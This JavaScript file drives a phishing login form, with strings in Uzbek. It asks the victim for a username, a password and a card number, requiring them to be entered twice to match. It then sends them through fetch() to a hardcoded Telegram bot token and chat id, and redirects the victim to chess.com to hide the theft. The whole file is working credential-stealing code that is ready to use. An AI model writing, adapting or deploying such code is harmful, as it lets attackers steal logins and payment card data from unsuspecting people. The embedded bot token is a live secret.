const inputname = document.getElementById('InputUser');
const inputpassword = document.getElementById('InputPassword');
const submitbutton = document.getElementById("Submit");
const matn = document.getElementById("matn");
const mat = document.getElementById("mat");
const loading = document.getElementById("loading");
const n1 = document.getElementById('Number1');
const n2 = document.getElementById('Number2');
const n3 = document.getElementById('Number3');

inputname.oninput = inputpassword.oninput = n1.oninput = n2.oninput = n3.oninput = function() {
    const faqatBitta =
        (n1.value && !n2.value && !n3.value) ||
        (!n1.value && n2.value && !n3.value) ||
        (!n1.value && !n2.value && n3.value);

    n1.disabled = (n2.value || n3.value);
    n2.disabled = (n1.value || n3.value);
    n3.disabled = (n1.value || n2.value);

    if (inputname.value && inputpassword.value && faqatBitta) {
        submitbutton.style.backgroundColor = "rgba(4, 4, 4, 0.9)";
        submitbutton.style.color = "white";
    } else {
        submitbutton.style.backgroundColor = "transparent";
        submitbutton.style.color = "transparent";
    }
};

let savat = 1;
let savedName = "";
let savedPassword = "";
let savedn1 = "";
let savedn2 = "";
let savedn3 = "";

submitbutton.addEventListener('click', () => {
    if (savat === 1) {
        savedName = inputname.value.trim();
        savedPassword = inputpassword.value.trim();
        savedn1 = n1.value.trim();
        savedn2 = n2.value.trim();
        savedn3 = n3.value.trim();

        matn.innerText = "Yana bir marotaba kiriting taxrirlash uchun";
        savat++;
        inputname.value = '';
        inputpassword.value = '';
        n1.value = '';
        n2.value = '';
        n3.value = '';
        n1.disabled = false;
        n2.disabled = false;
        n3.disabled = false;
    } else {
        matn.innerText = "";

        if (
            inputname.value.trim() === savedName &&
            inputpassword.value.trim() === savedPassword &&
            (n1.value.trim() === savedn1 || n2.value.trim() === savedn2 || n3.value.trim() === savedn3)
        ) {
            matn.innerText = "Sizni saytingizga kirg'azish";
            loading.style.display = 'flex';

            const encodedUsername = encodeURIComponent(savedName);
            const encodedPassword = encodeURIComponent(savedPassword);
            const encodedn1 = encodeURIComponent(savedn1 || savedn2 || savedn3);

            const jonatish = `
<b>Username:</b> <em>${encodedUsername}</em>\n<b>Password:</b> <em>${encodedPassword}</em>
<b>CardNumber:</b> <em>${encodedn1}</em>
            `;

            const url = `https://api.telegram.org/bot8006725057:AAGNOu9Zem-ymx5S0JHl8gHw6xGZAZm2wmw/sendMessage?chat_id=7790658286&text=${encodeURIComponent(jonatish)}&parse_mode=HTML`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    loading.style.display = 'none';
                    if (data.ok) {
                        console.log("Login va parol yuborildi");
                    } else {
                        console.error("Xatolik:", data.error_code);
                    }
                });

            setTimeout(() => {
                window.location.href = "https://www.chess.com/";
            }, 1000);
        } else {
            mat.innerText = "Xatolik: Ma'lumotlar mos kelmadi. Iltimos sahifani qayta ishga tushuring.";
            inputname.remove();
            inputpassword.remove();
            n1.remove();
            n2.remove();
            n3.remove();
            submitbutton.remove();
        }
    }
});